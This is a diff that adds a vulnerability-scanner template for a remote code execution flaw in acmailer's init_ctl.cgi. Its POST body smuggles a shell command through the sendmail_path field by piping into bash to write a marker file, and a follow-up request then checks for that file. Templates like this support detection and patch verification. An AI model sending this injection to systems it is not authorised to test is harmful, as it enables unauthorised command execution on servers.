@@ -1,0 +1,18 @@
+cve-id: acmailer-emailcms-init-rce
+set:
+  r: randomInt(5)
+rules:
+- method: POST
+  path: /init_ctl.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0
+  body: |
+     admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|echo+%60echo+eE4FA74Ed3%60%3E{{r}}.txt%20|%20bash&homeurl=http%3A%2F%2F&mypath=e
+- method: GET
+  path: /{{r}}.txt
+  headers:
+    User-Agent: Mozilla/5.0
+  expression: 'response.status == 200 && response.body.bcontains(b"eE4FA74Ed3")'
+severity: critical
+type: rce
